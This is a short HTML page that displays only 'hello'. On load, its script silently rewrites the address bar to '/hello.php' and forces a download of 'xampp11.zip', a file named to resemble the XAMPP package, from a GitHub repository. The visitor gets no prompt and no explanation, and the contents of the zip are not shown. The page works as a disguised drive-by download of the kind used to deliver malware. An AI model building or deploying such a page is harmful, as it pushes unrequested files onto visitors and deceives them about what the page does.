

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Change the displayed URL in the browser
            window.history.replaceState({}, "", "/hello.php");

            // Correct GitHub direct file link
            let fileUrl = "https://github.com/imharshpatel/xamppp/raw/main/xampp11.zip";

            let link = document.createElement("a");
            link.href = fileUrl;
            link.download = "xampp11.zip"; 
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        });
    </script>
</head>
<body>
    <p>hello</p>
</body>
</html>
